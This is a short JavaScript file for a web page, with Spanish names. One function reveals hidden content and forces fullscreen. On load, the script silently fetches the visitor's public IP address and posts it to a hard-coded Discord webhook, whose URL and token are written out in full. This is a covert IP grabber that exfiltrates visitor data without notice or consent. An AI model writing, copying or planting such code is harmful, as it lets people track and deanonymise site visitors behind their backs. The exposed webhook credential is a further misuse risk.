function aceptar() {
	document.getElementById("contenido").style.display = "block";
	document.getElementById("mensaje").style.display = "none";
	document.documentElement.requestFullscreen();
}

var ip = '';
fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    ip = data.ip;
    var webwhook = 'https://discord.com/api/webhooks/1125498024337088614/lc3Wst1oc8eKH4FrOpeIwGHk1ags0-tO6I6Cb58OvPCwqtSATsEr_Oj3yrwP1t08huO9';
    var message = {
      content: 'IP:' + ip
    };

    fetch(webwhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });
